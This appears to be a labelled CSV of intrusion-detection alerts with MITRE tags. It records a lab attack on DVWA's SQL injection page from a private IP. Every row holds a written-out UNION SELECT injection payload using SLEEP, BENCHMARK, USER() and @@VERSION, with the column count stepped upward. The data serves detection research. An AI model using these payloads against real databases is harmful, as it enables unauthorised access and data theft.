timestamp,rule_id,rule_level,data_id,MITRE_ID,MITRE_Tactic,srcip,dstip,full_log,data_protocol,data_url,label
2025-03-31T21:51:41.180+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:51:41 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18",2
2025-03-31T21:51:47.187+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:51:46 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",2
2025-03-31T21:51:53.195+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:51:51 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",2
2025-03-31T21:51:57.201+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:51:56 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",2
2025-03-31T21:52:03.207+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:52:01 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",2
2025-03-31T21:52:07.212+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:52:06 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",2
2025-03-31T21:52:13.224+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:52:11 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",2
2025-03-31T21:52:17.226+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:52:16 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",2
2025-03-31T21:52:23.233+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:52:21 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",2
2025-03-31T21:52:27.238+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:52:26 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",2
2025-03-31T21:52:33.248+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:52:31 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",2
2025-03-31T21:52:37.255+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:52:36 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",2
2025-03-31T21:52:43.262+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:52:41 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",2
2025-03-31T21:52:47.267+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:52:46 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20USER()--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20USER()--%20,2
2025-03-31T21:52:53.277+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:52:51 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20SLEEP(5)--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20SLEEP(5)--%20,2
2025-03-31T21:52:57.281+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:52:56 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20USER(),SLEEP(5)--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20USER(),SLEEP(5)--%20",2
2025-03-31T21:53:03.289+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:53:01 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5)--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5)--%20",2
2025-03-31T21:53:07.296+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:53:07 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--%20",2
2025-03-31T21:53:13.310+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:53:12 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL--%20",2
2025-03-31T21:53:17.311+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:53:17 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--%20",2
2025-03-31T21:53:23.328+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:53:22 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--%20",2
2025-03-31T21:53:27.336+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:53:27 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--%20",2
2025-03-31T21:53:33.345+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:53:32 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--%20",2
2025-03-31T21:53:37.375+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:53:37 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL--%20",2
2025-03-31T21:53:43.367+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:53:42 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20",2
2025-03-31T21:53:49.374+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:53:47 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20",2
2025-03-31T21:53:53.384+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:53:52 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20",2
2025-03-31T21:53:59.387+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:53:57 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20",2
2025-03-31T21:54:03.392+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:54:02 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20",2
2025-03-31T21:54:09.402+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:54:07 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20",2
2025-03-31T21:54:13.405+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:54:12 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20",2
2025-03-31T21:54:19.417+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:54:17 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20",2
2025-03-31T21:54:23.424+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:54:22 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20",2
